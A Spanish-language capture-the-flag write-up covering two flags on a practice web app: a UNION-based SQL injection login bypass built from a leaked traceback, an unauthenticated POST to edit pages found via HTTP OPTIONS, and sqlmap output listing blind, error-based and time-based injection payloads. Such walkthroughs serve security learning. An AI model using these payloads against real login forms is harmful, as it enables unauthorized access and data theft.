# Nivel 3

## WriteUp: Flag 1

Ahora mejorada la seguridad del sitio piden login para editar.

Para atacar le tire una lista enorme a usuario y pass. Me lanza esto:

```text
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 233, in execute
    query = query.encode(db.encoding)
UnicodeEncodeError: 'latin-1' codec can't encode character u'\u2026' in position 298: ordinal not in range(256)
```

Entonces enumeremos ahi tenemos una query y ambos motores mysql y mariadb. Desde burp vemos que usa parametros como username and password para el login simple. 

![](../../.gitbook/assets/imagen%20%28725%29.png)

Estudiando el error que lanza 

```text
SELECT password FROM admins WHERE username=\'%s\'' ....
```

Esto puede convertirse en un ataque de union donde elegimos que colocar del lado del usuario de cerrar las etiquetas

```text
SELECT password FROM admins WHERE username='' UNION SELECT "AAA" AS password WHERE '1' = '1'
```

En el burp lanzando el siguiente POST:

`username='UNION SELECT '123' AS password FROM admins WHERE '1' = '1&password=123`

Con eso logramos acceder a la 1er flag

## Flag 2: metodos http

_\(This flag was absolute bs\)_

Recomendado este motor online para peticiones http [https://httpie.io/run](https://httpie.io/run) 

Viendo que podemos utilizar http OPTIONS estando logeados las paginas de edicion permiten el post directamente, permitiendo que un atacante cree una pagina sin estar logeado

Haciendo OPTIONS http://35.196.135.216:5001/5022561f51/page/edit/3

```text
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 16 Aug 2021 18:16:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Allow: HEAD, GET, POST, OPTIONS
```

Desde nuestro cliente externo hacemos el POST

![](../../.gitbook/assets/imagen%20%28929%29.png)

## Extra: pruebas con SQLMAP

```text
sqlmap -u http://35.190.155.168/5a75132eac/login --data "username=&password=" --dbms mysql
```

![](../../.gitbook/assets/imagen%20%28726%29.png)

```text
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=' OR NOT 3326=3326#&password=

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=' AND (SELECT 3419 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(3419=3419,1))),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bXqA&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 4422 FROM (SELECT(SLEEP(5)))ujEb)-- KIuK&password=
---
[11:58:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[11:58:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/35.190.155.168'

```



